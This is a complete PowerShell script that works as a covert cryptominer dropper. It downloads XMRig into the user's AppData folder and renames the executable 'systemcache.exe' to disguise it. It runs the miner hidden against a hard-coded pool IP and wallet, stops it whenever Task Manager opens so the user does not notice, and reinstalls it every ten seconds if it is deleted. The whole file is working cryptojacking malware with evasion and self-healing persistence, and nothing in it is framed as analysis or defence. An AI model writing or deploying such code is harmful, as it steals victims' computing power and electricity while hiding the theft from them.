# ================================
# StartMining.ps1 - Optimized Self-Healing Miner (10s Check, Full Dir Watch)
# ================================
$AppData      = $env:APPDATA
$MinerDir     = "$AppData\XMRigMiner"
$MinerVersion = "6.21.0"
$ZipUrl       = "https://github.com/xmrig/xmrig/releases/download/v$MinerVersion/xmrig-$MinerVersion-msvc-win64.zip"
$ZipPath      = "$MinerDir\xmrig.zip"
$ExtractPath  = "$MinerDir\extract"
$TargetDir    = "$MinerDir\xmrig-$MinerVersion"
$ExeName      = "systemcache.exe"
$MinerPath    = "$TargetDir\$ExeName"
$Wallet       = "BTC:1H8fueovMvcQLArhxw7P4QZ3FAfhEZg7CB.worker1"
$Pool         = "159.203.162.18:3333"
$Password     = "x"
$LogFile      = "$MinerDir\miner.log"

# === Detect GPU once
$gpuArgs = ""
try {
    $gpus = Get-WmiObject Win32_VideoController | Select-Object -ExpandProperty Name
    foreach ($gpu in $gpus) {
        if ($gpu -like "*nvidia*") {
            $gpuArgs = "--cuda --cuda-launch=16x1"
        } elseif ($gpu -like "*amd*" -or $gpu -like "*radeon*") {
            $gpuArgs = "--opencl --opencl-threads=1 --opencl-launch=64x1"
        }
    }
} catch {}

# === Build arguments once
$args = "--algo randomx --url $Pool --user $Wallet --pass $Password --randomx-no-numa --randomx-mode=light --no-huge-pages --threads=1 --cpu-priority=0 --donate-level=1 --no-color --log-file `"$LogFile`" --api-port 0 $gpuArgs"

# === Watchdog loop
while ($true) {
    # Check: reinstall if exe or any folder in path is missing
    if (
        -not (Test-Path $MinerPath) -or
        -not (Test-Path $MinerDir) -or
        -not (Test-Path $TargetDir)
    ) {
        try {
            if (!(Test-Path $MinerDir)) {
                New-Item -ItemType Directory -Path $MinerDir -Force | Out-Null
            }

            Invoke-WebRequest -Uri $ZipUrl -OutFile $ZipPath -UseBasicParsing
            Expand-Archive -LiteralPath $ZipPath -DestinationPath $ExtractPath -Force

            Move-Item "$ExtractPath\xmrig-$MinerVersion" $TargetDir -Force
            Rename-Item "$TargetDir\xmrig.exe" "$MinerPath"

            Remove-Item $ZipPath -Force
            Remove-Item $ExtractPath -Recurse -Force
        } catch {
            Start-Sleep -Seconds 10
            continue
        }
    }

    # Check Task Manager
    $taskmgr = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Name -eq "Taskmgr" }
    $running = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Name -eq "systemcache" }

    if ($taskmgr) {
        if ($running) {
            Stop-Process -Name "systemcache" -Force
        }
    } elseif (-not $running) {
        Start-Process -FilePath $MinerPath -ArgumentList $args -WindowStyle Hidden
    }

    # Delay before rechecking
    Start-Sleep -Seconds 10
}
